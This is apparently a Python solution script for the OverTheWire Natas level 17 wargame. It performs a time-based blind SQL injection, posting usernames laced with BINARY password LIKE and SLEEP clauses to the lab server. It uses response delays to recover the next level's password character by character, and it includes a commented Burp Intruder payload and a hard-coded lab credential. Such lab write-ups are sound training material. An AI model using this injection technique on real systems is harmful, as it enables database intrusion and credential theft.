import requests
from string import *
from time import *

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

url = 'http://%s.natas.labs.overthewire.org/index.php' % username

# List of password has been founded
seen_password = list()

# Cluster bomb mode
# Payload_1 = 1->32
# Payload_2 = characters
# payload_burp={'username':'natas18" AND IF(SUBSTRING(BINARY password,§1§,1)='§a§',SLEEP(5),0)#'}

seen_password = list()

with open('natas17.html', 'w+') as out:
    session = requests.Session()
    # res = session.post(url, auth=(username, password),)
    # content = res.text
    # out.write(content)
    while (len(seen_password) < 32):
        for ch in characters:
            print('Trying brute-force password with character: %s' %
                  "".join(seen_password) + ch)
            payload = {'username': 'natas18" AND BINARY password LIKE "' +
                       "".join(seen_password) + ch + '%" AND SLEEP(1) # '}
            start_time = time()
            response = session.post(
                url+'?debug=true', auth=(username, password), data=payload)
            content = response.text
            end_time = time()
            # response_time = end_time - start_time
            response_time = response.elapsed.total_seconds()
            # print(f"Response time:{response_time:.4f} seconds")

            if (response_time > 1):
                seen_password.append(ch)
                break
